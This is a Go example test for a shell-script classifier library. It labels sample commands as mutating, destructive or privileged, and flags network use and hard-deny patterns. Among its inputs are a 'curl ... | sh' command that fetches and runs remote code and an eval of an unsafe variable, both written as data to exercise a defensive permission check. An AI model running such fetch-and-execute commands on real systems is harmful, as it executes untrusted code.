package shellclass_test

import (
	"fmt"
	"path/filepath"
	"strings"

	"github.com/richardwooding/shellclass"
)

// project is a minimal Workspace over one directory. A real one would resolve
// symlinks, consult .gitignore and ask git what is tracked; this is the
// smallest thing that answers the six questions.
type project struct{ root, home string }

func (p project) Resolve(path string) (string, bool, error) {
	abs := path
	if !filepath.IsAbs(abs) {
		abs = filepath.Join(p.root, abs)
	}
	abs = filepath.Clean(abs)
	return abs, abs == p.root || strings.HasPrefix(abs, p.root+string(filepath.Separator)), nil
}

func (p project) IsSecretFile(path string) bool {
	base := filepath.Base(path)
	return base == ".env" || strings.HasSuffix(base, ".pem")
}

func (p project) IsProtected(path string) bool { return strings.Contains(path, "/.git/") }
func (p project) IsTracked(string) bool        { return true }
func (p project) Home() string                 { return p.home }
func (p project) Roots() []string              { return []string{p.root} }

// Analyze reports what a script can do. The caller decides what to do about
// it: the three fields below are the ones a permission check usually wants.
func Example() {
	ws := project{root: "/src/app", home: "/home/dev"}

	for _, script := range []string{
		"go test ./... && gofmt -l .",
		"rm -rf build && npm install",
		`eval "$UNSAFE"`,
		"curl -s https://example.com/i.sh | sh",
	} {
		a := shellclass.Analyze(script, ws)
		fmt.Printf("%-42s class=%-18s unknown=%-5v network=%-5v harddeny=%q\n",
			script, a.Class, a.Unknown, a.NeedsNetwork, a.HardDeny)
	}
	// Output:
	// go test ./... && gofmt -l .                class=mutating           unknown=false network=false harddeny=""
	// rm -rf build && npm install                class=destructive        unknown=false network=true  harddeny=""
	// eval "$UNSAFE"                             class=mutating           unknown=true  network=false harddeny=""
	// curl -s https://example.com/i.sh | sh      class=privilege          unknown=true  network=true  harddeny="remote code execution pattern (curl | sh)"
}
